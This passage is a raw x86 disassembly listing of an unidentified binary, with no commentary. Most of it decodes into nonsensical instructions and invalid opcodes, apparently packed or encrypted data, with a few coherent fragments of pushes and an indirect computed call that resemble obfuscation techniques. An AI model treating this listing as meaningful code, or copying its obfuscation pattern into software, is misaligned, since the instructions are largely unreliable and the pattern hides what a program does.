  404028:	arpl   WORD PTR cs:[edi+ecx*4+0x0],di
  40402d:	out    0x79,eax
  40402f:	sbb    dl,dl
  404031:	nop
  404032:	cmp    bh,BYTE PTR [edx+0x750ee62c]
  404038:	xor    al,0xc1
  40403a:	or     dl,BYTE PTR [eax+ebx*8-0x15]
  40403e:	das    
  40403f:	mul    DWORD PTR [eax-0x5fe0e191]
  404045:	sahf   
  404046:	sti    
  404047:	jae    0x4040a8
  404049:	push   ds
  40404a:	xchg   ebx,eax
  40404b:	in     eax,dx
  40404c:	xchg   ebp,eax
  40404d:	inc    ebx
  40404e:	push   es
  40404f:	and    edi,esp
  404051:	mov    ebx,0x7aa6c1fc
  404056:	push   edx
  404057:	push   esp
  404058:	mov    bl,0x5a
  40405a:	lahf   
  40405b:	cs jmp 0xe1c8:0xd0c92221
  404063:	out    0xdd,al
  404065:	ficomp WORD PTR [ebx+0x62]
  404068:	shl    BYTE PTR [edx-0x78],cl
  40406b:	xor    ch,ah
  40406d:	sbb    esp,DWORD PTR [eax+0x5fcd1a1c]
  404073:	jle    0x40403a
  404075:	jns    0x4040d1
  404077:	aaa    
  404078:	fnstenv [edx-0x7457137b]
  40407e:	mov    ss,WORD PTR [esi-0x250b8e36]
  404084:	repnz arpl WORD PTR [edi+0x454720d8],bx
  40408b:	mov    esp,0xcde403e3
  404090:	jns    0x4040fe
  404092:	dec    esp
  404093:	lods   eax,DWORD PTR ds:[esi]
  404094:	pop    ebx
  404095:	push   edx
  404096:	adc    ecx,DWORD PTR [edx+0x2e1439a9]
  40409c:	mov    bh,al
  40409e:	enter  0xdf58,0xc6
  4040a2:	lahf   
  4040a3:	mov    WORD PTR [esi],es
  4040a5:	push   esp
  4040a6:	mov    ah,0xde
  4040a8:	es mov bh,0x70
  4040ab:	repnz sub DWORD PTR [ebp-0x74],ebx
  4040af:	lea    ebp,[esi+0x54edcdd9]
  4040b5:	dec    edx
  4040b6:	mov    cl,0xcf
  4040b8:	xor    eax,0x9f63a437
  4040bd:	ja     0x40404c
  4040bf:	fistp  QWORD PTR [esi-0x41dd26fb]
  4040c5:	cmp    eax,0x3d2510b3
  4040ca:	cmc    
  4040cb:	mov    bl,0x83
  4040cd:	or     BYTE PTR [ecx-0x329850ad],ah
  4040d3:	pusha  
  4040d4:	int3   
  4040d5:	mov    dh,0xae
  4040d8:	into   
  4040d9:	popa   
  4040da:	inc    esi
  4040db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040dc:	cmp    BYTE PTR [edx+0x3bcaf69a],dh
  4040e2:	or     eax,0xa053df26
  4040e7:	sbb    eax,0x4091991
  4040ec:	daa    
  4040ed:	sub    BYTE PTR [edx-0x4],0xb8
  4040f1:	mov    esi,0x9ea42716
  4040f6:	imul   edi,DWORD PTR [ecx+0x4c],0x34
  4040fa:	xchg   esp,eax
  4040fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040fc:	inc    eax
  4040fd:	mov    eax,edi
  4040ff:	out    dx,eax
  404100:	lds    ecx,FWORD PTR [esi-0xe]
  404103:	mov    WORD PTR [eax+0x158068a1],ss
  404109:	(bad)  
  40410b:	in     eax,dx
  40410c:	xor    BYTE PTR ds:0xc0f71577,al
  404112:	sti    
  404113:	aas    
  404114:	loop   0x404154
  404116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404117:	neg    BYTE PTR [ecx]
  404119:	outs   dx,DWORD PTR ds:[esi]
  40411a:	cmp    eax,0x884bc6eb
  40411f:	dec    ecx
  404120:	jmp    0x9714f455
  404125:	jo     0x4040f3
  404127:	test   DWORD PTR [ecx-0x3b],edx
  40412a:	pop    ebp
  40412b:	jb     0x4040e1
  40412d:	pop    es
  40412e:	sub    edx,edi
  404130:	mov    ecx,0x1e27640f
  404135:	xlat   BYTE PTR ds:[ebx]
  404136:	mov    dh,0x5c
  404138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404139:	ins    BYTE PTR es:[edi],dx
  40413a:	mov    eax,ds:0x6516b26d
  40413f:	dec    ebx
  404140:	fistp  DWORD PTR [edx]
  404142:	xor    cl,BYTE PTR [edx+0x51f4e2ce]
  404148:	fwait
  404149:	adc    ah,BYTE PTR [bx+si]
  40414c:	mov    ebx,0x69a9ab0f
  404151:	jecxz  0x404125
  404153:	fiadd  WORD PTR [edx]
  404155:	and    bh,BYTE PTR [eax+ebp*4+0x5649f5c0]
  40415c:	ret    
  40415d:	pusha  
  40415e:	mov    BYTE PTR [ecx],al
  404160:	(bad)  
  404161:	or     BYTE PTR [esi+0x4c2dc601],cl
  404167:	(bad)  
  404168:	and    BYTE PTR [ebx-0x6d9ce98e],ah
  40416e:	dec    eax
  40416f:	xchg   edi,eax
  404170:	sbb    bl,BYTE PTR [ebp+0x46344722]
  404176:	mov    bh,0x80
  404178:	cmp    eax,0x42ed0b0b
  40417d:	sahf   
  40417e:	int3   
  40417f:	mov    ds:0xe8532dcf,al
  404184:	fistp  WORD PTR [eax+0x50]
  404187:	cmp    al,0xef
  404189:	repz xor dl,ch
  40418c:	cld    
  40418d:	sub    DWORD PTR [edi+0x4a],ecx
  404190:	mov    edi,0xfb07ed37
  404195:	imul   edx,DWORD PTR [eax+0x715f9727],0xe7d9bcc7
  40419f:	dec    edx
  4041a0:	dec    eax
  4041a1:	lahf   
  4041a2:	pusha  
  4041a3:	and    ch,BYTE PTR [edx-0x6a]
  4041a6:	and    al,0xe3
  4041a8:	or     DWORD PTR [esp+ebp*4-0x35],0xffffffae
  4041ad:	push   edx
  4041ae:	in     eax,0xf8
  4041b0:	js     0x4041fd
  4041b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041b3:	push   edi
  4041b4:	ja     0x4041e3
  4041b6:	int3   
  4041b7:	dec    ebx
  4041b8:	sub    DWORD PTR [edx+0x6],esi
  4041bb:	gs add eax,0x8679fa87
  4041c2:	push   0xb3aa9a7a
  4041c7:	dec    eax
  4041c8:	add    BYTE PTR [esi],bl
  4041ca:	in     eax,0xa5
  4041cc:	inc    eax
  4041cd:	lods   eax,DWORD PTR ds:[esi]
  4041ce:	aam    0x67
  4041d0:	inc    ecx
  4041d1:	jle    0x40423c
  4041d3:	ja     0x404222
  4041d5:	addr16 push ds
  4041d7:	xchg   ebx,eax
  4041d8:	sbb    al,0x6d
  4041da:	loope  0x4041ad
  4041dc:	aaa    
  4041dd:	xchg   DWORD PTR ds:0xcfdac809,ebx
  4041e3:	mov    ebx,0x58202f1b
  4041e8:	setl   BYTE PTR [edx+0x6abd1869]
  4041ef:	mov    ebp,0x3eb60af0
  4041f4:	cmp    eax,0x2268560a
  4041f9:	add    eax,0xe75a4005
  4041fe:	arpl   WORD PTR [ebp-0x32],ax
  404201:	push   es
  404202:	mov    al,0xd4
  404204:	push   ebx
  404205:	leave  
  404206:	es in  al,dx
  404208:	ret    0x8fa6
  40420b:	mov    dh,0x8c
  40420d:	loope  0x4041fb
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x1d],0x12
  404248:	push   edx
  404249:	scas   al,BYTE PTR es:[edi]
  40424a:	aad    0x25
  40424c:	jle    0x4042cc
  40424e:	outs   dx,DWORD PTR ds:[esi]
  40424f:	jge    0x4042cf
  404251:	jle    0x4042a1
  404253:	sbb    DWORD PTR [ebp*1-0x9272bbb],edx
  40425a:	gs jb  0x404279
  40425d:	add    edi,DWORD PTR [edx-0x21c8851a]
  404263:	or     ecx,DWORD PTR [edx]
  404265:	sbb    ecx,DWORD PTR [ebp+0x6a0c30b8]
  40426b:	inc    ecx
  40426c:	xor    DWORD PTR [ebx*4-0x2f053742],0xffffffed
  404274:	mov    BYTE PTR [esi],0x75
  404277:	mov    ebx,0x933e3835
  40427c:	stc    
  40427d:	and    ebp,ecx
  40427f:	mov    al,ds:0x9615271b
  404284:	neg    BYTE PTR [ebp-0xab90887]
  40428a:	std    
  40428b:	bound  ecx,QWORD PTR [eax+eax*1]
  40428e:	popf   
  40428f:	adc    DWORD PTR [ecx-0x77],ebp
  404292:	push   ds
  404293:	ja     0x4042ba
  404295:	and    esi,edi
  404297:	or     dl,ah
  404299:	mov    ebp,0x7b01727f
  40429e:	cmc    
  40429f:	cli    
  4042a0:	bound  ebx,QWORD PTR [edx-0x33adb60a]
  4042a6:	ret    0x9558
  4042a9:	push   0xcf0fbb3a
  4042ae:	inc    ebx
  4042af:	sub    eax,0xac2af96d
  4042b4:	and    al,0x24
  4042b6:	mov    ch,0xbe
  4042b8:	pushf  
  4042b9:	test   al,0x8
  4042bb:	inc    edi
  4042bc:	xchg   edi,eax
  4042bd:	in     eax,0x1d
  4042bf:	mov    ebp,0x119cb75d
  4042c4:	push   ebp
  4042c5:	cmp    bh,dl
  4042c7:	gs push ebp
  4042c9:	pop    ecx
  4042ca:	and    eax,DWORD PTR [eax]
  4042cc:	lahf   
  4042cd:	mov    ebp,0x64ed39e
  4042d2:	mov    dh,0xce
  4042d4:	cmp    al,0xbd
  4042d6:	repz mov ds:0x553d2f17,al
  4042dc:	cmp    ebx,DWORD PTR [ebx-0x69a970f7]
  4042e2:	fimul  WORD PTR [edx+0xe]
  4042e5:	dec    eax
  4042e6:	les    ecx,FWORD PTR [esi]
  4042e8:	jno    0x4042f1
  4042ea:	or     eax,0xb8ce4320
  4042ef:	or     al,0x48
  4042f1:	out    0x74,eax
  4042f3:	aas    
  4042f4:	lods   eax,DWORD PTR ds:[esi]
  4042f5:	aam    0x1d
  4042f7:	es (bad) 
  4042f9:	(bad)  
  4042fa:	cmp    eax,0xc4975453
  4042ff:	fsub   DWORD PTR [ebx]
  404301:	test   eax,0x9b6fbe36
  404306:	pop    es
  404307:	gs js  0x404342
  40430a:	push   cs
  40430b:	test   DWORD PTR [eax+edi*2],ebx
  40430e:	rcl    BYTE PTR [edi],cl
  404310:	pop    ds
  404311:	aad    0xe1
  404313:	inc    ebp
  404314:	add    DWORD PTR [ebp+0x5dfa9ac7],ebx
  40431a:	(bad)  
  40431b:	fild   QWORD PTR [eax+0x4959a2aa]
  404321:	add    DWORD PTR [ecx],ebx
  404323:	rcl    BYTE PTR [esi],0xa2
  404326:	sub    ch,al
  404328:	rcr    bl,0x55
  40432b:	inc    esi
  40432c:	or     ebp,DWORD PTR [eax-0x4df38b9e]
  404332:	inc    edx
  404333:	push   0xb9607f3f
  404338:	outs   dx,DWORD PTR ds:[esi]
  404339:	mov    ?,ebp
  40433b:	push   ebp
  40433c:	hlt    
  40433d:	popf   
  40433e:	loope  0x404358
  404340:	jmp    0x1b7e4c5
  404345:	jae    0x4043b7
  404347:	and    dl,BYTE PTR [edi]
  404349:	adc    BYTE PTR [ecx+0x2293bbe7],cl
  40434f:	imul   ebp,ebp,0x22
  404352:	push   ecx
  404353:	xor    al,0xb5
  404355:	or     cl,ah
  404357:	mov    eax,0xe7123258
  40435c:	mov    al,ds:0x9aa08180
  404361:	mov    dh,0x2c
  404363:	add    eax,0xcced7edf
  404368:	xchg   esp,eax
  404369:	add    bh,ch
  40436b:	add    al,0xbd
  40436d:	fst    st(0)
  40436f:	sar    esi,cl
  404371:	push   esi
  404372:	dec    edi
  404373:	jp     0x404382
  404375:	jecxz  0x40431c
  404377:	pop    ecx
  404378:	sub    al,0x52
  40437a:	or     ebx,ebp
  40437c:	and    eax,0xeacde6ea
  404381:	and    eax,0x7591d49c
  404386:	adc    eax,0xa28d0c64
  40438b:	stos   BYTE PTR es:[edi],al
  40438c:	mov    ds:0x52af361c,eax
  404392:	cli    
  404393:	sbb    al,0x54
  404395:	mov    al,0x37
  404397:	(bad)  
  404398:	icebp  
  404399:	pop    ecx
  40439a:	ret    0x207c
  40439d:	cmp    DWORD PTR [eax-0x60],0x40
  4043a1:	hlt    
  4043a2:	inc    esi
  4043a3:	sub    BYTE PTR ds:0xa858ff89,dl
  4043a9:	add    cl,al
  4043ab:	pmuludq mm7,QWORD PTR [edx+0x10098d75]
  4043b2:	and    eax,0xe9b11db0
  4043b7:	clc    
  4043b8:	bound  esi,QWORD PTR [esi]
  4043ba:	xchg   ebp,eax
  4043bb:	loop   0x40435b
  4043bd:	test   bl,dl
  4043bf:	mov    edi,0x695e41f7
  4043c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c5:	(bad)  
  4043c6:	sbb    al,0x41
  4043c8:	mov    al,ds:0x34e4cd39
  4043cd:	arpl   WORD PTR [ebp-0x68],cx
  4043d0:	sbb    eax,DWORD PTR [eax+0x7f]
  4043d3:	gs inc ebp
  4043d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043d6:	cmp    cl,BYTE PTR [ebp+0x67dd9b18]
  4043dc:	inc    ebx
  4043dd:	mov    dh,0x8e
  4043df:	pushf  
  4043e0:	rcl    BYTE PTR [ecx-0x46],0x7a
  4043e4:	adc    ebp,DWORD PTR [ebx-0x3f]
  4043e7:	retf   0x25a0
  4043ea:	je     0x40444b
  4043ec:	mov    ebx,0x17ed61e1
  4043f1:	push   edx
  4043f2:	fs jp  0x4043b1
  4043f5:	loopne 0x404412
  4043f7:	cli    
  4043f8:	repnz dec edx
  4043fa:	sti    
  4043fb:	inc    ebp
  4043fc:	pop    ss
  4043fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043fe:	jne    0x4043ab
  404400:	es in  eax,dx
  404402:	add    BYTE PTR [esi-0x7a],dl
  404405:	loope  0x4043b0
  404407:	scas   eax,DWORD PTR es:[edi]
  404408:	imul   ebx,ecx,0xffffff8c
  40440b:	scas   al,BYTE PTR es:[edi]
  40440c:	mov    dh,dl
  40440e:	jnp    0x404407
  404410:	jge    0x40441f
  404412:	jge    0x4043a8
  404414:	lds    ecx,FWORD PTR [ecx+esi*2]
  404417:	mov    al,0x67
  404419:	fisttp DWORD PTR [edx+0x8]
  40441c:	loopne 0x40441e
  40441e:	dec    esi
  40441f:	sbb    al,0xe1
  404421:	push   es
  404422:	cmp    bl,BYTE PTR [esi]
  404424:	dec    edx
  404425:	cld    
  404426:	mov    al,ds:0xa7095ff4
  40442b:	div    DWORD PTR [ebx+eax*1]
  40442e:	bound  eax,QWORD PTR ds:[edx-0x2b]
  404432:	xlat   BYTE PTR ds:[ebx]
  404433:	or     cl,bh
  404435:	(bad)
  404439:	mov    esp,0x4fe9ca5c
  40443e:	jne    0x404473
  404440:	sbb    DWORD PTR [ecx],esi
  404442:	cdq    
  404443:	add    al,0xbc
  404445:	aad    0xd1
  404447:	outs   dx,DWORD PTR ds:[esi]
  404448:	sbb    BYTE PTR [esi+0x19],bh
  40444b:	ds in  eax,0xf4
  40444e:	out    0xa0,eax
  404450:	inc    ebx
  404451:	adc    ah,al
  404453:	arpl   WORD PTR [edi],bp
  404455:	stc    
  404456:	add    ebx,DWORD PTR [edi+0x7b490304]
  40445c:	xor    BYTE PTR [ecx+0x72af8115],cl
  404462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404463:	add    esi,DWORD PTR [esi+eax*8+0x55346c23]
  40446a:	stc    
  40446b:	pop    DWORD PTR [eax-0x10f45d95]
  404471:	jmp    0xe2deec6c
  404476:	outs   dx,BYTE PTR ds:[esi]
  404477:	xchg   ebp,eax
  404478:	cmp    BYTE PTR [esi+ebp*8+0x23],bh
  40447c:	jno    0x404485
  40447e:	mov    ds:0x60f931ed,al
  404483:	and    BYTE PTR [eax-0x4df3b5f7],ch
  404489:	test   eax,0x314072
  40448e:	mov    al,ds:0x794edc71
  404493:	jg     0x404461
  404495:	loope  0x404510
  404497:	loopne 0x40447d
  404499:	xchg   bl,al
  40449b:	shl    DWORD PTR [eax-0x14],cl
  40449e:	div    BYTE PTR [edx]
  4044a0:	enter  0x6613,0x2f
  4044a4:	mov    ch,0xa0
  4044a6:	sub    cl,cl
  4044a8:	int    0x87
  4044aa:	sar    DWORD PTR [edi+0x2bcc5299],0xf9
  4044b1:	push   esp
  4044b2:	outs   dx,BYTE PTR ds:[esi]
  4044b3:	sbb    eax,0x7082f33f
  4044b8:	inc    edi
  4044b9:	int    0xae
  4044bb:	push   0xcf3d4078
  4044c0:	int3   
  4044c1:	dec    esi
  4044c2:	push   esi
  4044c3:	test   eax,0xd8478c9
  4044c8:	xchg   ecx,eax
  4044c9:	xchg   ebp,eax
  4044ca:	jmp    0x4044af
  4044cc:	ret    0xd555
  4044cf:	pop    ebp
  4044d0:	retf   0xb511
  4044d3:	pop    eax
  4044d4:	test   eax,0x306735a4
  4044d9:	imul   ebp,DWORD PTR [edx],0x81a7c1df
  4044df:	pop    ecx
  4044e0:	mov    ecx,0x8375588e
  4044e5:	mov    ebx,0xf2c4826e
  4044ea:	lods   al,BYTE PTR ds:[esi]
  4044eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ec:	inc    ebp
  4044ed:	xor    edx,DWORD PTR [edi+esi*4-0x53ac5b00]
  4044f4:	push   ss
  4044f5:	push   ebp
  4044f6:	mov    ecx,0xdcc39e2
  4044fb:	sbb    al,0xe0
  4044fd:	xor    eax,0x7ac33ddd
  404502:	xor    ah,dh
  404504:	sub    BYTE PTR [edx],ah
  404506:	dec    ebx
  404507:	aaa    
  404508:	dec    eax
  404509:	into   
  40450a:	popf   
  40450b:	shl    dh,1
  40450d:	dec    esi
  40450e:	lea    ebx,ds:0x9191340f
  404514:	xchg   ecx,eax
  404515:	into   
  404516:	retf   0xd0be
  404519:	mov    al,ds:0x75382a90
  40451e:	test   BYTE PTR [edi],dh
  404520:	pop    eax
  404521:	inc    ebx
  404522:	out    dx,eax
  404523:	daa    
  404524:	mov    ah,0x1
  404526:	in     al,0x26
  404528:	dec    esi
  404529:	pop    eax
  40452a:	inc    edx
  40452b:	xchg   edx,eax
  40452c:	mov    cl,0xa7
  40452e:	test   ebp,esi
  404530:	or     DWORD PTR [edx],esi
  404532:	sbb    al,0x17
  404534:	fsubrp st(3),st
  404536:	mov    ebx,0xf6bc74a4
  40453b:	ror    DWORD PTR [ecx+0x2deaa1f8],1
  404541:	sbb    edi,DWORD PTR [edx]
  404543:	ja     0x40450c
  404545:	inc    edx
  404546:	call   0x3a86:0x4b10df37
  40454d:	jecxz  0x4045c8
  40454f:	pop    ecx
  404550:	add    DWORD PTR [ecx-0x49012480],ebp
  404556:	fst    DWORD PTR [ebp+0x7d]
  404559:	aas    
  40455a:	and    BYTE PTR [ebp+0x40],bh
  40455d:	cmp    BYTE PTR [ecx+edx*2],bl
  404560:	ins    BYTE PTR es:[edi],dx
  404561:	lods   eax,DWORD PTR ds:[esi]
  404562:	sub    DWORD PTR [edi],eax
  404564:	jno    0x4045cc
  404566:	push   ebx
  404567:	cdq    
  404568:	xchg   edi,eax
  404569:	popa   
  40456a:	jmp    0xd7eed365
  40456f:	mul    esp
  404571:	(bad)  
  404572:	mov    cl,BYTE PTR [ebp+0x7863aa20]
  404578:	popa   
  404579:	inc    eax
  40457a:	punpcklbw mm7,DWORD PTR [esi-0x77c4029b]
  404581:	push   es
  404582:	or     dh,BYTE PTR [edi]
  404584:	jbe    0x404564
  404586:	push   ebx
  404587:	popa   
  404588:	pop    ds
  404589:	and    al,0x49
  40458b:	stc    
  40458c:	dec    ebx
  40458d:	stc    
  40458e:	jno    0x4045a9
  404590:	fld    DWORD PTR [ecx+0x6c]
  404593:	jle    0x404582
  404595:	test   al,0x6f
  404597:	or     bh,BYTE PTR [ecx]
  404599:	adc    al,0x69
  40459b:	fidivr WORD PTR [ebp+eax*8-0x1bf5aaa9]
  4045a2:	mov    ds:0x8e59648e,al
  4045a7:	ins    DWORD PTR es:[edi],dx
  4045a8:	fistp  DWORD PTR [eax]
  4045aa:	les    ebp,FWORD PTR [edi-0x32]
  4045ad:	pop    esi
  4045ae:	xor    al,0xf0
  4045b1:	and    ch,BYTE PTR gs:[ebx]
  4045b4:	pop    eax
  4045b5:	jno    0x4045e7
  4045b7:	jp     0x404544
  4045b9:	pop    eax
  4045ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045bb:	jno    0x4045b6
  4045bd:	emms   
  4045bf:	sub    bh,BYTE PTR gs:[ebp-0x3f]
  4045c3:	inc    ecx
  4045c4:	test   DWORD PTR [ebx],ecx
  4045c6:	test   al,0xf1
  4045c8:	mov    di,0xbc7b
  4045cc:	push   edx
  4045cd:	mov    dl,0x1
  4045cf:	mov    eax,0xd244beb6
  4045d4:	and    eax,0xe09e1616
  4045d9:	xor    DWORD PTR [edx-0x42],edi
  4045dc:	push   ds
  4045dd:	mov    cl,0xca
  4045df:	fcomp  QWORD PTR [edi+0x51b9b21b]
  4045e5:	ror    DWORD PTR [edi],1
  4045e7:	adc    bh,BYTE PTR [esp+eax*4+0x58]
  4045eb:	xchg   DWORD PTR [esi-0x33],esp
  4045ee:	xchg   esp,eax
  4045ef:	xchg   edi,eax
  4045f0:	out    0xf6,al
  4045f2:	fwait
  4045f3:	push   cs
  4045f4:	pslld  mm3,QWORD PTR [eax+eiz*2+0x76]
  4045f9:	or     bh,BYTE PTR [ebx+ebp*4+0x38bee290]
  404600:	dec    ebp
  404601:	mov    cl,BYTE PTR fs:[eax+0x40]
  404605:	(bad)  
  404606:	out    0x6a,eax
  404608:	sbb    DWORD PTR ds:0xe8861f9,esp
  40460e:	(bad)  
  404610:	outs   dx,DWORD PTR ds:[esi]
  404611:	lods   eax,DWORD PTR ds:[esi]
  404612:	sub    edi,0xb98fc99e
  404618:	in     al,dx
  404619:	test   ecx,esp
  40461b:	mov    ebp,0xe7eb9040
  404620:	mov    ds:0x147b07eb,al
  404625:	fs xchg esp,eax
  404627:	retf   
  404628:	xor    esp,ebx
  40462a:	(bad)  
  40462b:	hlt    
  40462c:	shr    BYTE PTR [eax],cl
  40462e:	pop    ecx
  40462f:	pop    edx
  404630:	jg     0x404696
  404632:	cmp    DWORD PTR [edi+0x47],edi
  404635:	and    DWORD PTR [edi+0x50fee77e],ebp
  40463b:	dec    eax
  40463c:	mov    esp,0x65c9d665
  404641:	mov    BYTE PTR [edi],cl
  404643:	push   DWORD PTR [eax]
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0xc77988e3
  404675:	pusha  
  404676:	ret    0x7e21
  404679:	jle    0x4046ea
  40467b:	jge    0x4046fb
  40467d:	jle    0x404660
  40467f:	and    DWORD PTR [eax+ecx*8+0x5f1b389e],0xffffff9c
  404687:	xchg   ecx,eax
  404688:	jbe    0x40460c
  40468a:	jp     0x4046d0
  40468c:	in     al,dx
  40468d:	(bad)  [edi+0x7f2fc2f4]
  404693:	jns    0x404634
  404695:	retf   0x37b7
  404698:	or     dl,BYTE PTR [edi+eiz*2+0x79]
  40469c:	sti    
  40469d:	pop    ecx
  40469e:	inc    edi
  40469f:	mov    BYTE PTR [eax],ah
  4046a1:	sub    ah,BYTE PTR [ebp-0x27e76463]
  4046a7:	icebp  
  4046a8:	sbb    BYTE PTR [ecx-0x43],dh
  4046ab:	xor    BYTE PTR [ecx],0x61
  4046ae:	pop    esp
  4046af:	dec    edi
  4046b0:	ret    
  4046b1:	shl    esp,0x86
  4046b4:	dec    esi
  4046b5:	xchg   ecx,eax
  4046b6:	ins    BYTE PTR es:[edi],dx
  4046b7:	or     BYTE PTR [edx+0x39c744ad],dh
  4046bd:	sbb    BYTE PTR [ebp-0x50],al
  4046c0:	cmp    DWORD PTR [ecx+0xd75e43b],ebx
  4046c6:	dec    ebx
  4046c7:	xor    eax,0x10916368
  4046cc:	shl    DWORD PTR [ebx-0x7ab07126],cl
  4046d2:	cdq    
  4046d3:	ins    BYTE PTR es:[edi],dx
  4046d4:	push   esi
  4046d5:	and    al,0x8c
  4046d7:	retf   
  4046d8:	xchg   bh,ah
  4046da:	int3   
  4046db:	loope  0x404664
  4046dd:	test   BYTE PTR [esp+edi*2],0xd2
  4046e1:	and    al,0x5d
  4046e3:	ds pop esi
  4046e5:	push   ecx
  4046e6:	pop    esp
  4046e7:	xor    eax,0xc3499ed2
  4046ec:	call   0x94ce:0x172ce1ec
  4046f3:	inc    edx
  4046f4:	pop    esi
  4046f5:	icebp  
  4046f6:	and    dh,BYTE PTR [ebx]
  4046f8:	in     al,0x60
  4046fa:	lea    ecx,[ebp-0x27]
  4046fd:	and    al,0xfc
  4046ff:	xchg   ecx,eax
  404700:	add    al,bl
  404702:	cwde   
  404703:	cwde   
  404704:	loopne 0x40470f
  404706:	push   cs
  404707:	stos   DWORD PTR es:[edi],eax
  404708:	mov    cl,0xfd
  40470a:	popa   
  40470b:	inc    ecx
  40470c:	push   esi
  40470d:	leave  
  40470e:	mov    ?,ebx
  404710:	add    al,0x77
  404712:	inc    edx
  404713:	adc    ebx,ecx
  404715:	js     0x4046d4
  404717:	add    al,0x1e
  404719:	xor    DWORD PTR [ebp-0xe],eax
  40471c:	sar    dl,cl
  40471e:	push   ecx
  40471f:	jge    0x404758
  404721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404722:	mov    bh,0x10
  404724:	outs   dx,DWORD PTR ds:[esi]
  404725:	mov    ds:0x5bb3ef48,al
  40472a:	dec    ebx
  40472b:	cdq    
  40472c:	adc    ah,BYTE PTR [edi+0x3c]
  40472f:	sti    
  404730:	jns    0x40477d
  404732:	mov    al,0x52
  404734:	mov    al,ds:0x6435a68e
  404739:	ds cld 
  40473b:	sbb    cl,ch
  40473d:	mov    dl,0xf7
  40473f:	outs   dx,BYTE PTR ds:[esi]
  404740:	mov    cl,0xda
  404742:	mov    dl,0x25
  404744:	mov    dh,0xf
  404746:	test   al,0xe
  404748:	lea    esp,[eax]
  40474a:	ds xchg ebx,eax
  40474c:	xor    cl,bl
  40474e:	in     eax,dx
  40474f:	lods   al,BYTE PTR ds:[esi]
  404750:	and    al,0x14
  404752:	retf   
  404753:	pop    edx
  404754:	icebp  
  404755:	xchg   esi,edx
  404757:	stc    
  404758:	shr    DWORD PTR [ebx-0x2fdae4eb],1
  40475e:	enter  0x37cd,0xcf
  404762:	sahf   
  404763:	scas   al,BYTE PTR es:[edi]
  404764:	ret    
  404765:	pop    esi
  404766:	ss popf 
  404768:	stos   DWORD PTR es:[edi],eax
  404769:	mov    eax,0xb89ba049
  40476e:	xchg   esp,eax
  40476f:	int    0x1b
  404771:	push   ds
  404772:	daa    
  404773:	xchg   ebp,eax
  404774:	xor    eax,0x54f03ef5
  404779:	pop    eax
  40477a:	not    bh
  40477c:	jl     0x40477d
  40477e:	into   
  40477f:	scas   eax,DWORD PTR es:[edi]
  404780:	pop    es
  404781:	leave  
  404782:	cmp    eax,0x29b71fb
  404787:	mov    dl,0xbd
  404789:	push   es
  40478a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40478b:	xlat   BYTE PTR ds:[ebx]
  40478c:	pop    ecx
  40478d:	ins    BYTE PTR es:[edi],dx
  40478e:	add    dl,BYTE PTR [ebx]
  404790:	stos   DWORD PTR es:[edi],eax
  404791:	push   es
  404792:	mov    WORD PTR [ecx],ss
  404794:	(bad)  
  404795:	ja     0x4047d1
  404797:	and    al,0xa7
  404799:	std    
  40479a:	pushf  
  40479b:	repnz pop ecx
  40479d:	mov    cl,0x64
  40479f:	sub    DWORD PTR [esp+edx*2-0x33],edx
  4047a3:	pop    edx
  4047a4:	je     0x40479a
  4047a6:	(bad)  
  4047a8:	pop    ss
  4047a9:	jns    0x404750
  4047ab:	pop    ebp
  4047ac:	mov    DWORD PTR [eax+0x738e3e64],edi
  4047b2:	out    dx,al
  4047b3:	inc    esp
  4047b4:	mov    es:0x8b1a4e25,eax
  4047ba:	stos   BYTE PTR es:[edi],al
  4047bb:	mov    BYTE PTR [edi+ebx*2+0x104e1010],0xc3
  4047c3:	out    dx,al
  4047c4:	jecxz  0x404754
  4047c6:	adc    al,0xc
  4047c8:	cli    
  4047c9:	fst    DWORD PTR [ebp-0x43]
  4047cc:	dec    eax
  4047cd:	push   esi
  4047ce:	lods   al,BYTE PTR ds:[esi]
  4047cf:	mov    ah,0xef
  4047d1:	lahf   
  4047d2:	int    0xf8
  4047d4:	mov    ebp,0xf791346e
  4047d9:	enter  0x775,0x8e
  4047dd:	or     eax,0x945a6a44
  4047e2:	mov    bl,0x9c
  4047e4:	in     eax,dx
  4047e5:	sub    dl,BYTE PTR [eax+0x7c]
  4047e8:	or     BYTE PTR [ebp+0x44af814c],bh
  4047ee:	scas   eax,DWORD PTR es:[edi]
  4047ef:	xor    eax,0x82d65d1e
  4047f4:	mov    edx,DWORD PTR [esi+0x724746f5]
  4047fa:	test   al,0x3
  4047fc:	xor    al,0xe2
  4047fe:	push   ecx
  4047ff:	push   ebp
  404800:	lock int3 
